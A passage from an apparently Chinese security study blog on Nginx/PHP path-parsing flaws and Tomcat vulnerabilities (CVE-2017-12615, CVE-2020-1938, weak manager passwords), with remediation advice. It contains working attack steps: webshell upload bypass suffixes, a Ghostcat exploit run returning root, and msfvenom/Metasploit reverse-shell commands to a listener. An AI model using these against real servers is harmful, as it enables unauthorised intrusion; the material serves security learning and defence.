$<span class="number">1</span>;</span><br><span class="line">            <span class="comment">#将文件地址后的参数赋值给变量 $path_info</span></span><br><span class="line">            set $path_info $<span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">#配置fastcgi的一些参数</span></span><br><span class="line">    fastcgi_param SCRIPT_NAME $real_script_name;</span><br><span class="line">    fastcgi_param PATH_INFO $path_info;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="使用-php-的-cgi-fix-pathinfo-功能"><a href="#使用-php-的-cgi-fix-pathinfo-功能" class="headerlink" title="使用 php 的 cgi.fix_pathinfo 功能"></a>使用 php 的 cgi.fix_pathinfo 功能</h5><p>此方式通过将 <code>php.ini</code> 当中的 <code>cgi.fix_pathinfo</code> 设置为1, 并且在 <code>nginx</code> 中加入一条 <code>fastcgi_param PATH_INFO $fastcgi_script_name;</code></p><p>当开启 <code>fix_pathinfo</code> 之后, <code>php</code> 会根据 <code>CGI 1.1</code> 的规范来分析 <code>SCRIPT_FILENAME</code>, 从中截取什么是真正的执行脚本, 什么是 <code>PATH_INFO</code>, 并且修正对应的变量</p><h3 id="FAST-CGI解析漏洞"><a href="#FAST-CGI解析漏洞" class="headerlink" title="FAST-CGI解析漏洞"></a>FAST-CGI解析漏洞</h3><h4 id="漏洞介绍及成因-5"><a href="#漏洞介绍及成因-5" class="headerlink" title="漏洞介绍及成因"></a>漏洞介绍及成因</h4><p>nginx.conf</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">location ~ \.php($|&#x2F;) &#123;</span><br><span class="line">     fastcgi_pass   127.0.0.1:9000;</span><br><span class="line">     fastcgi_index  index.php;</span><br><span class="line">     set $script    $uri;</span><br><span class="line">     set $path_info &quot;&quot;;</span><br><span class="line">     if ($uri ~ &quot;^(.+\.php)(&#x2F;.*)&quot;) &#123;</span><br><span class="line">          set  $script     $1;</span><br><span class="line">          set  $path_info  $2;</span><br><span class="line">     &#125;</span><br><span class="line">     include       fastcgi_params;</span><br><span class="line">     fastcgi_param SCRIPT_FILENAME   $document_root$script;</span><br><span class="line">     fastcgi_param SCRIPT_NAME       $script;</span><br><span class="line">     fastcgi_param PATH_INFO         $path_info;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过正则匹配以后, SCRIPT_NAME会被设置为”fake.jpg/foo.php”, 继而构造成SCRIPT_FILENAME传递个PHP CGI，fix_pathinfo开启之后PHP会认为SCRIPT_FILENAME是fake.jpg, 而foo.php是PATH_INFO, 然后PHP就把fake.jpg当作一个PHP文件来解释执行。</p><p>最重要的一点是 <code>php-fpm.conf</code> 中的 <code>security.limit_extensions</code> 配置项限制了 <code>fastcgi</code> 解析文件的类型(即指定什么类型的文件当做代码解析),此项设置为空的时候才允许 <code>fastcgi</code> 将 <code>.png</code> 等文件当做代码解析。</p><p>尝试浏览器访问一下,具体的文件路径,可以看到脚本名字、脚本路径</p><p><code>&lt;?php var_dump($_SERVER)?&gt;</code></p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/25A99970-DF7A-4DB1-9CFA-8A634944B783.png" alt="25A99970-DF7A-4DB1-9CFA-8A634944B783"></p><h4 id="漏洞复现-3"><a href="#漏洞复现-3" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip&#x2F;1.jpg&#x2F;1.php</span><br></pre></td></tr></table></figure><h4 id="漏洞修复-2"><a href="#漏洞修复-2" class="headerlink" title="漏洞修复"></a>漏洞修复</h4><p><code>http://xiumu.blog.51cto.com/hacker.jpg/abc.php</code>成功利用的前提</p><p>1、php.ini中的配置选项<code>cgi.fix_pathinfo=1</code>并且php-fpm中的<code>security.limit_extensions</code>没有开启</p><p>从5.3.9开始,php官方加入了一个配置”security.limit_extensions”,默认只允许执行扩展名为”.php”的文件,造成了其他类型的文件不支持的问题.</p><p>将 cgi.fix_pathinfo = 0 ,可能会导致很多MVC框架(如ThinkPHP)对url美化无法正常运行。</p><p>防御思路</p><p>1、开启</p><p><code>security.limit_extensions=.php</code> 只允许后缀为php的文件解析</p><p>2、</p><p>使用 nginx 的 fastcgi_split_path_info 功能</p><p>此种方式依赖 <code>nginx</code> 的 <code>fastcgi_split_path_info</code> 指令, 该指令通过正则表达式来对 <code>uri</code> 进行处理, 从中分理出真实脚本文件和 <code>PATH_INFO</code>, 并根据正则捕获组来设置两个重要变量</p><ol><li>$fastcgi_script_name</li><li>$fastcgi_path_info</li></ol><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/8B77F3C7-DC39-48C0-99C5-4CC7B1C123AC.png" alt="8B77F3C7-DC39-48C0-99C5-4CC7B1C123AC"></p><h2 id="Tomcat"><a href="#Tomcat" class="headerlink" title="Tomcat"></a>Tomcat</h2><h3 id="Tomcat学习"><a href="#Tomcat学习" class="headerlink" title="Tomcat学习"></a>Tomcat学习</h3><h4 id="Tomcat与Servlet"><a href="#Tomcat与Servlet" class="headerlink" title="Tomcat与Servlet"></a>Tomcat与Servlet</h4><h5 id="Tomcat-1"><a href="#Tomcat-1" class="headerlink" title="Tomcat"></a>Tomcat</h5><h6 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h6><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20200930141720152.png" alt="image-20200930141720152"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">* bin       :tomcat的执行的文件.</span><br><span class="line">* conf      :tomcat的配置文件.</span><br><span class="line">* lib       :tomcat运行的需要的jar包.</span><br><span class="line">* logs      :tomcat的运行的日志文件.</span><br><span class="line">* temp      :tomcat产生临时文件存放的路径.</span><br><span class="line">* webapps   :tomcat发布的web项目的路径.</span><br><span class="line">* work      :tomcat运行JSP的时候,JSP翻译成Servlet的代码存放的路径.</span><br></pre></td></tr></table></figure><h6 id="Tomcat发布项目"><a href="#Tomcat发布项目" class="headerlink" title="Tomcat发布项目"></a>Tomcat发布项目</h6><ul><li><p>将编写并编译好的web项目(注意要是编译好的，如果是 eclipse，可以将项目打成 war 包放入)，放入到 webapps 中。</p><p>在浏览器输入：<code>http://localhost:8080/</code>项目名/访问的文件名。</p></li><li><p>打开tomcat下conf/server.xml，在<code>&lt;Host&gt; &lt;/Host&gt;</code>标签之间输入项目配置信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;Context path&#x3D;&quot;&#x2F;WebProject&quot; docBase&#x3D;&quot;D:&#x2F;WebProject&quot; reloadable&#x3D;&quot;true&quot; &#x2F;&gt;</span><br></pre></td></tr></table></figure><p>path:浏览器访问时的路径名</p><p>docBase:web项目的WebRoot所在的路径，注意是WebRoot的路径，不是项目的路径。其实也就是编译后的项目</p><p>reloadble:设定项目有改动时，tomcat是否重新加载该项目</p><p>浏览器访问</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:8080&#x2F;WebProject&#x2F;HelloTomcat.jsp</span><br></pre></td></tr></table></figure></li><li><p>进入到 apache-tomcat-7.0.52\conf\Catalina\localhost 目录，新建一个 项目名.xml 文件。</p><p>在 那个新建的 xml 文件中，增加下面配置语句</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;Context  docBase&#x3D;&quot;D:&#x2F;WebProject&quot; reloadable&#x3D;&quot;true&quot; &#x2F;&gt;</span><br></pre></td></tr></table></figure><p>localhost:8080/xml文件名/访问的文件名。</p></li></ul><p>①、第一种方法比较普通，但是我们需要将编译好的项目重新 copy 到 webapps 目录下，多出了两步操作。</p><p>②、第二种方法直接在 server.xml 文件中配置，但是从 tomcat5.0版本开始后，server.xml 文件作为 tomcat 启动的主要配置文件，一旦 tomcat 启动后，便不会再读取这个文件，因此无法再 tomcat 服务启动后发布 web 项目。</p><p>③、第三种方法是最好的，每个项目分开配置，tomcat 将以\conf\Catalina\localhost 目录下的 xml 文件的文件名作为 web 应用的上下文路径，而不再理会<code> &lt;Context&gt;</code>中配置的 path 路径，因此在配置的时候，可以不写path。</p><h6 id="Tomcat敏感目录"><a href="#Tomcat敏感目录" class="headerlink" title="Tomcat敏感目录"></a>Tomcat敏感目录</h6><h6 id="tomcat-users-xml-用户配置文件"><a href="#tomcat-users-xml-用户配置文件" class="headerlink" title="tomcat-users.xml 用户配置文件"></a>tomcat-users.xml 用户配置文件</h6><p>获取用户账户、密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">  &lt;role rolename&#x3D;&quot;tomcat&quot;&#x2F;&gt;</span><br><span class="line">  &lt;role rolename&#x3D;&quot;role1&quot;&#x2F;&gt;</span><br><span class="line">  &lt;user username&#x3D;&quot;tomcat&quot; password&#x3D;&quot;&lt;must-be-changed&gt;&quot; roles&#x3D;&quot;tomcat&quot;&#x2F;&gt;</span><br><span class="line">  &lt;user username&#x3D;&quot;both&quot; password&#x3D;&quot;&lt;must-be-changed&gt;&quot; roles&#x3D;&quot;tomcat,role1&quot;&#x2F;&gt;</span><br><span class="line">  &lt;user username&#x3D;&quot;role1&quot; password&#x3D;&quot;&lt;must-be-changed&gt;&quot; roles&#x3D;&quot;role1&quot;&#x2F;&gt;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><h5 id="servlet"><a href="#servlet" class="headerlink" title="servlet"></a>servlet</h5><h6 id="tomcat和servlet的关系"><a href="#tomcat和servlet的关系" class="headerlink" title="tomcat和servlet的关系"></a>tomcat和servlet的关系</h6><p>Tomcat 是Web应用服务器,是一个Servlet/JSP容器. Tomcat 作为Servlet容器,负责处理客户请求,把请求传送给Servlet,并将Servlet的响应传送回给客户.而Servlet是一种运行在支持Java语言的服务器上的组件. Servlet最常见的用途是扩展Java Web服务器功能,提供非常安全的,可移植的,易于使用的CGI替代品.</p><p>从http协议中的请求和响应可以得知，浏览器发出的请求是一个请求文本，而浏览器接收到的也应该是一个响应文本。但是在上面这个图中，并不知道是如何转变的，只知道浏览器发送过来的请求也就是request，我们响应回去的就用response。</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20200930152555870.png" alt="image-20200930152555870"></p><p>①：Tomcat将http请求文本接收并解析，然后封装成HttpServletRequest类型的request对象，所有的HTTP头数据读可以通过request对象调用对应的方法查询到。</p><p>②：Tomcat同时会要响应的信息封装为HttpServletResponse类型的response对象，通过设置response属性就可以控制要输出到浏览器的内容，然后将response交给tomcat，tomcat就会将其变成响应文本的格式发送给浏览器　</p><p>Java Servlet API 是Servlet容器(tomcat)和servlet之间的接口，它定义了serlvet的各种方法，还定义了Servlet容器传送给Servlet的对象类，其中最重要的就是ServletRequest和ServletResponse。所以说我们在编写servlet时，需要实现Servlet接口，按照其规范进行操作。</p><h6 id="web-xml中servlet配置及其含义"><a href="#web-xml中servlet配置及其含义" class="headerlink" title="web.xml中servlet配置及其含义"></a>web.xml中servlet配置及其含义</h6><p>要从浏览器访问Java servlet，必须告诉servlet容器要部署哪些servlet以及要将servlet映射到哪个URL。 这是在Java Web应用程序的web.xml文件中完成的。</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20200930152001965.png" alt="image-20200930152001965"></p><p>首先浏览器通过<a href="http://localhost:8080/test01/MyServlet%E6%9D%A5%E6%89%BE%E5%88%B0web.xml%E4%B8%AD%E7%9A%84url-pattern%EF%BC%8C%E8%BF%99%E5%B0%B1%E6%98%AF%E7%AC%AC%E4%B8%80%E6%AD%A5%EF%BC%8C%E5%8C%B9%E9%85%8D%E5%88%B0%E4%BA%86url-pattern%E5%90%8E%EF%BC%8C%E5%B0%B1%E4%BC%9A%E6%89%BE%E5%88%B0%E7%AC%AC%E4%BA%8C%E6%AD%A5servlet%E7%9A%84%E5%90%8D%E5%AD%97MyServlet%EF%BC%8C%E7%9F%A5%E9%81%93%E4%BA%86%E5%90%8D%E5%AD%97%EF%BC%8C%E5%B0%B1%E5%8F%AF%E4%BB%A5%E9%80%9A%E8%BF%87servlet-name%E6%89%BE%E5%88%B0%E7%AC%AC%E4%B8%89%E6%AD%A5%EF%BC%8C%E5%88%B0%E4%BA%86%E7%AC%AC%E4%B8%89%E6%AD%A5%EF%BC%8C%E4%B9%9F%E5%B0%B1%E8%83%BD%E5%A4%9F%E7%9F%A5%E9%81%93servlet%E7%9A%84%E4%BD%8D%E7%BD%AE%E4%BA%86%E3%80%82%E7%84%B6%E5%90%8E%E5%88%B0%E5%85%B6%E4%B8%AD%E6%89%BE%E5%88%B0%E5%AF%B9%E5%BA%94%E7%9A%84%E5%A4%84%E7%90%86%E6%96%B9%E5%BC%8F%E8%BF%9B%E8%A1%8C%E5%A4%84%E7%90%86%E3%80%82">http://localhost:8080/test01/MyServlet来找到web.xml中的url-pattern，这就是第一步，匹配到了url-pattern后，就会找到第二步servlet的名字MyServlet，知道了名字，就可以通过servlet-name找到第三步，到了第三步，也就能够知道servlet的位置了。然后到其中找到对应的处理方式进行处理。</a></p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><h4 id="CVE-2017-12615"><a href="#CVE-2017-12615" class="headerlink" title="CVE-2017-12615"></a>CVE-2017-12615</h4><p>影响版本：Apache Tomcat 7.0.0-Apache Tomcat 7.0.81</p><h5 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h5><p>Tomcat PUT方法任意写文件漏洞</p><p>该漏洞可以利用HTTP的PUT方法直接上传webshell到目标服务器，从而获取权限。</p><p>在Tomcat的web.xml默认情况下不存在该漏洞，但是一单开发者或者运维人员手动讲web.xml中的readonly设置为false，可以通过 PUT / DELETE 进行文件操控。</p><p>漏洞的核心错误配置是web.xml中的readonly</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="keyword">init</span>-param&gt; </span><br><span class="line">&lt;param-name&gt;<span class="keyword">readonly</span>&lt;/param-name&gt; </span><br><span class="line">&lt;param-<span class="keyword">value</span>&gt;<span class="literal">true</span>&lt;/param-<span class="keyword">value</span>&gt; </span><br><span class="line">&lt;/<span class="keyword">init</span>-param&gt;</span><br></pre></td></tr></table></figure><h5 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h5><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20200611151016949.png" alt="image-20200611151016949"></p><p>访问shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.1.102:8080&#x2F;Shell.jsp?cmd&#x3D;id</span><br></pre></td></tr></table></figure><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20200611151044485.png" alt="image-20200611151044485"></p><h5 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h5><p>win：</p><p>1、利用/shell.jsp::$DATA的方式绕过<br>2、/shell.jsp%20，空格绕过<br>3、/shell.jsp/ ， Tomcat在处理文件时会删除最后的/<br>Linux：<br>1、/shell.jsp/ ， Tomcat在处理文件时会删除最后的/</p><p>漏洞分析</p><ul><li>web.xml配置</li></ul><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;servlet&gt;</span><br><span class="line">    &lt;servlet-name&gt;jsp&lt;/servlet-name&gt;</span><br><span class="line">    &lt;servlet-class&gt;org.apache.jasper.servlet.JspServlet&lt;/servlet-class&gt;</span><br><span class="line">    &lt;<span class="keyword">init</span>-param&gt;</span><br><span class="line">        &lt;param-name&gt;fork&lt;/param-name&gt;</span><br><span class="line">        &lt;param-<span class="keyword">value</span>&gt;<span class="literal">false</span>&lt;/param-<span class="keyword">value</span>&gt;</span><br><span class="line">    &lt;/<span class="keyword">init</span>-param&gt;</span><br><span class="line">    &lt;<span class="keyword">init</span>-param&gt;</span><br><span class="line">        &lt;param-name&gt;xpoweredBy&lt;/param-name&gt;</span><br><span class="line">        &lt;param-<span class="keyword">value</span>&gt;<span class="literal">false</span>&lt;/param-<span class="keyword">value</span>&gt;</span><br><span class="line">    &lt;/<span class="keyword">init</span>-param&gt;</span><br><span class="line">    &lt;load-<span class="keyword">on</span>-startup&gt;<span class="number">3</span>&lt;/load-<span class="keyword">on</span>-startup&gt;</span><br><span class="line">&lt;/servlet&gt;</span><br></pre></td></tr></table></figure><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;servlet&gt;</span><br><span class="line">    &lt;servlet-name&gt;<span class="keyword">default</span>&lt;/servlet-name&gt;</span><br><span class="line">    &lt;servlet-class&gt;org.apache.catalina.servlets.DefaultServlet&lt;/servlet-class&gt;</span><br><span class="line">    &lt;<span class="keyword">init</span>-param&gt;</span><br><span class="line">        &lt;param-name&gt;debug&lt;/param-name&gt;</span><br><span class="line">        &lt;param-<span class="keyword">value</span>&gt;<span class="number">0</span>&lt;/param-<span class="keyword">value</span>&gt;</span><br><span class="line">    &lt;/<span class="keyword">init</span>-param&gt;</span><br><span class="line">    &lt;<span class="keyword">init</span>-param&gt;</span><br><span class="line">        &lt;param-name&gt;listings&lt;/param-name&gt;</span><br><span class="line">        &lt;param-<span class="keyword">value</span>&gt;<span class="literal">false</span>&lt;/param-<span class="keyword">value</span>&gt;</span><br><span class="line">    &lt;/<span class="keyword">init</span>-param&gt;</span><br><span class="line">    &lt;load-<span class="keyword">on</span>-startup&gt;<span class="number">1</span>&lt;/load-<span class="keyword">on</span>-startup&gt;</span><br><span class="line">&lt;/servlet&gt;</span><br></pre></td></tr></table></figure><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;servlet-mapping&gt;</span><br><span class="line">    &lt;servlet-name&gt;<span class="keyword">default</span>&lt;/servlet-name&gt;</span><br><span class="line">    &lt;url-pattern&gt;/&lt;/url-pattern&gt;</span><br><span class="line">&lt;/servlet-mapping&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- The mappings <span class="keyword">for</span> the JSP servlet --&gt;</span><br><span class="line">&lt;servlet-mapping&gt;</span><br><span class="line">    &lt;servlet-name&gt;jsp&lt;/servlet-name&gt;</span><br><span class="line">    &lt;url-pattern&gt;*.jsp&lt;/url-pattern&gt;</span><br><span class="line">    &lt;url-pattern&gt;*.jspx&lt;/url-pattern&gt;</span><br><span class="line">&lt;/servlet-mapping&gt;</span><br></pre></td></tr></table></figure><p>我们可以看到如果url中有jsp、jspx会使用名字为jsp的servlet，进而调用<code>org.apache.jasper.servlet.JspServlet</code>类</p><p>反之调用默认servlet，进而调用<code>org.apache.catalina.servlets.DefaultServlet</code>。</p><ul><li><p>readonly</p><p>作用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--   readonly            Is this context &quot;read only&quot;, so HTTP           --&gt;</span><br><span class="line">&lt;!--                       commands like PUT and DELETE are               --&gt;</span><br><span class="line">&lt;!--                       rejected?  [true]                              --&gt;</span><br></pre></td></tr></table></figure></li><li><p>关键</p><p>配置文件中主要定义了default servlet 和 JSP servlet两个servlet，DefaultServlet的作用是处理静态文件 ，JspServlet 的作用是处理jsp 与jspx 文件的请求，同时DefaultServlet 可以处理 PUT 或 DELETE请求。</p><p> 可以看出即使设置readonly为false，默认tomcat也不允许PUT上传jsp和jspx文件的，因为后端都用org.apache.jasper.servlet.JspServlet来处理jsp或是jspx后缀的请求了，而JspServlet中没有PUT上传的逻辑，PUT的代码实现只存在于DefaultServlet中。</p></li></ul><p>漏洞的根本是通过构造特殊后缀名，绕过了tomcat检测，让它用DefaultServlet的逻辑去处理请求，从而上传jsp文件。上传jsp文件但是让他DefaultServlet来处理他。、</p><h5 id="防御方式"><a href="#防御方式" class="headerlink" title="防御方式"></a>防御方式</h5><ul><li>使用tomcat8及以上版本</li><li>在web.xml文件中将readonly参数删掉，或者将readonly参数设置为true</li></ul><h4 id="CVE-2020-1938"><a href="#CVE-2020-1938" class="headerlink" title="CVE-2020-1938"></a>CVE-2020-1938</h4><p>影响版本</p><p>Apache Tomcat 9.x &lt; 9.0.31<br>Apache Tomcat 8.x &lt; 8.5.51<br>Apache Tomcat 7.x &lt; 7.0.100<br>Apache Tomcat 6.x</p><p>Tomcat AJP协议由于存在实现缺陷导致相关参数可控，攻击者利用该漏洞可通过构造特定参数，读取服务器webapp下的任意文件。若服务器端同时存在文件上传功能，攻击者可进一步实现远程代码的执行。</p><p>当ajp URI设置为非jsp路径时，Tomcat会调用DefaultServlet处理，此时会导致web目录任意文件读取漏洞。当ajp URI设置为jsp路径时，Tomcat会调用JspServlet处理，此时会导致JSP文件包含漏洞。</p><h5 id="Web目录任意文件读取漏洞"><a href="#Web目录任意文件读取漏洞" class="headerlink" title="Web目录任意文件读取漏洞"></a>Web目录任意文件读取漏洞</h5><p>长亭扫描器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  xray .&#x2F;xray webscan --url http:&#x2F;&#x2F;127.0.0.1:8080&#x2F; --html-output single-url.html</span><br></pre></td></tr></table></figure><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20200612145955946.png" alt="image-20200612145955946"></p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20200612150021877.png" alt="image-20200612150021877"></p><h5 id="任意命令执行"><a href="#任意命令执行" class="headerlink" title="任意命令执行"></a>任意命令执行</h5><p>该漏洞可以任意文件类型解析为jsp，从而达到任意命令执行的效果。但漏洞需要配合文件上传漏洞才可利用，假设目标服务器已经有了一个shell.png，里面内容是执行任意命令，可以执行以下命令得到命令执行结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">margine:CVE-2020-1938 margin$ python 2020-10487.py -f &#x2F;shell.png 127.0.0.1 --rce 1</span><br><span class="line">Getting resource at ajp13:&#x2F;&#x2F;127.0.0.1:8009&#x2F;hissec.jsp</span><br><span class="line">----------------------------</span><br><span class="line">root</span><br></pre></td></tr></table></figure><p>反弹shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java&#x2F;jsp_shell_reverse_tcp LHOST&#x3D;IP LPORT&#x3D;4444 &gt; shell.txt</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit&#x2F;multi&#x2F;handler </span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set payload java&#x2F;jsp_shell_</span><br><span class="line">set payload java&#x2F;jsp_shell_bind_tcp     set payload java&#x2F;jsp_shell_reverse_tcp  </span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set payload java&#x2F;jsp_shell_reverse_tcp </span><br><span class="line">payload &#x3D;&gt; java&#x2F;jsp_shell_reverse_tcp</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set lhost 192.168.0.67</span><br><span class="line">lhost &#x3D;&gt; 192.168.0.67</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set lport 4444</span><br><span class="line">lport &#x3D;&gt; 4444</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.0.67:4444</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python 2020-10487.py -f &#x2F;shell.txt 127.0.0.1 --rce 1</span><br><span class="line">弱口令</span><br></pre></td></tr></table></figure><p>修复方法</p><p>禁用AJP协议</p><blockquote><p>&lt;Connector port=”8009”protocol=”AJP/1.3” redirectPort=”8443” /&gt;</p></blockquote><p>将此行注释掉（也可删掉该行）：</p><blockquote><!--<Connectorport="8009" protocol="AJP/1.3"redirectPort="8443" />--></blockquote><p>配置secret来设置AJP协议的认证凭证。</p><p>例如（注意必须将YOUR_TOMCAT_AJP_SECRET更改为一个安全性高、无法被轻易猜解的值）：</p><blockquote><p>&lt;Connector port=”8009”protocol=”AJP/1.3” redirectPort=”8443”address=”YOUR_TOMCAT_IP_ADDRESS” secret=”YOUR_TOMCAT_AJP_SECRET”/&gt;</p></blockquote><h4 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h4><h5 id="版本范围："><a href="#版本范围：" class="headerlink" title="版本范围："></a>版本范围：</h5><p>Tomcat版本：8.0</p><h5 id="漏洞原理："><a href="#漏洞原理：" class="headerlink" title="漏洞原理："></a>漏洞原理：</h5><p>Tomcat支持在后台部署war文件，可以直接将webshell部署到web目录下。其中，欲访问后台，需要对应用户有相应权限。</p><p>在<code>conf/tomcat-users.xml</code>文件中配置用户的权限：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;user username&#x3D;&quot;tomcat&quot; password&#x3D;&quot;tomcat&quot; roles&#x3D;&quot;manager-gui,manager-script,manager-jmx,manager-status,admin-gui,admin-script&quot; &#x2F;&gt;</span><br></pre></td></tr></table></figure><ul><li>manager-gui 拥有html页面权限</li><li>manager-status 拥有查看status的权限</li><li>manager-script 拥有text接口的权限，和status权限</li><li>manager-jmx 拥有jmx权限，和status权限</li></ul><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="line">&lt;tomcat-users xmlns=<span class="string">&quot;http://tomcat.apache.org/xml&quot;</span></span><br><span class="line">              xmlns:xsi=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="line">              xsi:schemaLocation=<span class="string">&quot;http://tomcat.apache.org/xml tomcat-users.xsd&quot;</span></span><br><span class="line">              version=<span class="string">&quot;1.0&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">    &lt;role rolename=<span class="string">&quot;manager-gui&quot;</span>/&gt;</span><br><span class="line">    &lt;role rolename=<span class="string">&quot;manager-script&quot;</span>/&gt;</span><br><span class="line">    &lt;role rolename=<span class="string">&quot;manager-jmx&quot;</span>/&gt;</span><br><span class="line">    &lt;role rolename=<span class="string">&quot;manager-status&quot;</span>/&gt;</span><br><span class="line">    &lt;role rolename=<span class="string">&quot;admin-gui&quot;</span>/&gt;</span><br><span class="line">    &lt;role rolename=<span class="string">&quot;admin-script&quot;</span>/&gt;</span><br><span class="line">    &lt;user username=<span class="string">&quot;tomcat&quot;</span> password=<span class="string">&quot;tomcat&quot;</span> roles=<span class="string">&quot;manager-gui,manager-script,manager-jmx,manager-status,admin-gui,admin-script&quot;</span> /&gt;</span><br><span class="line">    </span><br><span 